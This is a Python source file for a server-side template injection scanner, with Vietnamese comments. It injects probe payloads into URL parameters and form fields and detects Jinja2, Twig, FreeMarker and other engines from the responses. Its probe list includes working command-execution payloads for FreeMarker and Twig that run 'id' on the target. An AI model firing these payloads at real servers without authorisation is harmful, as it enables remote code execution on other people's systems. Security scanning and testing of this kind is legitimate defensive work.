"""
ssti.py - Server-Side Template Injection (SSTI) scanner
Phát hiện SSTI trong Jinja2, Twig, FreeMarker, Velocity, Mako, ERB.
SSTI = RCE tiềm năng, CVSS critical.
"""
import httpx
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

# Payload SSTI với giá trị expected khi thực thi
# Format: (payload, expected_result, engine_hint)
SSTI_PROBES = [
    # Math expression — engine sẽ tính toán
    ("{{7*7}}",          "49",     "Jinja2/Twig"),
    ("${7*7}",           "49",     "FreeMarker/Velocity"),
    ("#{7*7}",           "49",     "Thymeleaf"),
    ("<%= 7*7 %>",       "49",     "ERB/EJS"),
    ("{{7*'7'}}",        "7777777","Jinja2"),     # Jinja2 đặc trưng: str * int
    ("${{7*7}}",         "49",     "Twig"),
    ("{7*7}",            "49",     "Smarty"),
    ("*{7*7}",           "49",     "Spring SpEL"),
    ("@(7*7)",           "49",     "Razor"),
    # Jinja2 advanced
    ("{{config}}",       "Config", "Jinja2"),
    ("{{self._TemplateReference__context}}", "context", "Jinja2"),
    # FreeMarker
    ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
     "uid=", "FreeMarker RCE"),
    # Twig
    ("{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
     "uid=", "Twig RCE"),
]

# Error patterns chỉ ra template engine đang chạy
SSTI_ERROR_PATTERNS = [
    r"jinja2\.exceptions",
    r"TemplateSyntaxError",
    r"UndefinedError",
    r"twig\.error",
    r"TwigException",
    r"freemarker\.core",
    r"FreeMarkerException",
    r"velocity\.runtime",
    r"Smarty error",
    r"ParseException.*template",
]


class SSTIScanner:
    def __init__(self, timeout: int = 10, config: dict | None = None):
        self.timeout = timeout
        self.config  = config or {}

    def _inject_url(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _check_response(
        self, response_text: str, payload: str, expected: str, engine: str
    ) -> tuple[bool, str, float]:
        """
        Kiểm tra response có dấu hiệu SSTI không.
        Returns: (hit, evidence, confidence)
        """
        # Case 1: Expected result xuất hiện trong response → SSTI confirmed
        if expected in response_text:
            confidence = 0.95
            # Đặc biệt: 7*'7' = '7777777' chỉ Jinja2 mới làm được
            if expected == "7777777":
                confidence = 0.99
            return True, (
                f"SSTI confirmed ({engine}): payload '{payload}' → result '{expected}' "
                f"found in response"
            ), confidence

        # Case 2: Template error leak
        for pattern in SSTI_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, (
                    f"SSTI template error disclosed ({engine}): "
                    f"pattern '{pattern}' found in response"
                ), 0.80

        # Case 3: RCE indicators
        if "uid=" in response_text and ("gid=" in response_text or "groups=" in response_text):
            return True, f"SSTI RCE confirmed ({engine}): command output detected", 0.99

        return False, "", 0.0

    async def scan_url(self, url: str, client: httpx.AsyncClient) -> list[dict]:
        results = []
        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)
        if not params:
            return results

        # Lấy baseline để so sánh
        try:
            baseline_resp = await client.get(url)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_text = ""

        for param in params:
            found = False
            for payload, expected, engine in SSTI_PROBES:
                if found:
                    break
                test_url = self._inject_url(url, param, payload)
                try:
                    resp = await client.get(test_url)

                    # Bỏ qua nếu response giống baseline hoàn toàn
                    if resp.text == baseline_text:
                        continue

                    hit, evidence, confidence = self._check_response(
                        resp.text, payload, expected, engine
                    )
                    if hit:
                        severity = "CRITICAL" if confidence >= 0.90 else "HIGH"
                        cvss     = 9.8 if "RCE" in engine else 8.8
                        console.print(
                            f"  [red bold][SSTI][/red bold] {url} | "
                            f"param={param} | engine={engine} | conf={confidence:.0%}"
                        )
                        results.append({
                            "type":        f"Server-Side Template Injection (SSTI)",
                            "severity":    severity,
                            "url":         url,
                            "parameter":   param,
                            "payload":     payload,
                            "evidence":    evidence,
                            "confidence":  confidence,
                            "cvss_score":  cvss,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            "cwe":         "CWE-94",
                        })
                        found = True

                except Exception:
                    pass

        return results

    async def scan_form(self, form: dict, client: httpx.AsyncClient) -> list[dict]:
        results = []
        for inp in form["inputs"]:
            if not inp["name"] or inp["type"] in ("submit", "button", "hidden", "image"):
                continue

            for payload, expected, engine in SSTI_PROBES[:6]:  # Chỉ test 6 probe cơ bản cho forms
                data = {i["name"]: i["value"] or "test" for i in form["inputs"] if i["name"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "POST":
                        resp = await client.post(form["url"], data=data)
                    else:
                        resp = await client.get(form["url"], params=data)

                    hit, evidence, confidence = self._check_response(
                        resp.text, payload, expected, engine
                    )
                    if hit:
                        console.print(
                            f"  [red bold][SSTI FORM][/red bold] {form['url']} | "
                            f"input={inp['name']} | engine={engine}"
                        )
                        results.append({
                            "type":        "Server-Side Template Injection (SSTI, Form)",
                            "severity":    "CRITICAL",
                            "url":         form["url"],
                            "parameter":   inp["name"],
                            "payload":     payload,
                            "evidence":    evidence,
                            "confidence":  confidence,
                            "cvss_score":  9.8,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            "cwe":         "CWE-94",
                        })
                        break
                except Exception:
                    pass

        return results